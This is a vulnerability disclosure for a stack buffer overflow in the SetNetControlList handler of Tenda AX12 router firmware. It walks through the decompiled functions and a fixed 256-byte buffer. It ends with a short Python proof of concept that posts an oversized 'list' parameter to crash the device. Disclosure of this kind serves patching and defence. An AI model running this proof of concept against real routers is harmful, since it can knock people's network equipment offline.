## Overview

Firmware download website: https://www.tenda.com.cn/download/detail-3621.html

## Affected version

AX12 V.10  V22.03.01.46

## Vulnerability details

The Tenda AX12 V.10 V22.03.01.46 firmware has a stack overflow vulnerability in the handler function of `SetNetControlList`.

The handler function of `SetNetControlList` is `sub_43FDCC`

![alt text](https://github.com/zoemurmure/IoT-vulnerabilities/blob/main/imgs/image.png?raw=true)

The `v1` variable receives the `list` parameter which user can control. Then `v1` passes to the function `sub_43FBBC` as the first argument.

![alt text](https://github.com/zoemurmure/IoT-vulnerabilities/blob/main/imgs/image-1.png?raw=true)

The first argument `a1`(aka `v1`) is then copied to array `v14`. The array `v14` has a fixed size 256. 

![alt text](https://github.com/zoemurmure/IoT-vulnerabilities/blob/main/imgs/image-2.png?raw=true)

So the user provided parameter `list` can exceed the capacity of the `v14` array, which triggers this security vulnerability.

## PoC

```python
import requests
from pwn import*

ip = "192.168.100.2"
url = "http://" + ip + "/goform/SetNetControlList"
payload = b"a"*2000

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![alt text](https://github.com/zoemurmure/IoT-vulnerabilities/blob/main/imgs/image-3.png?raw=true)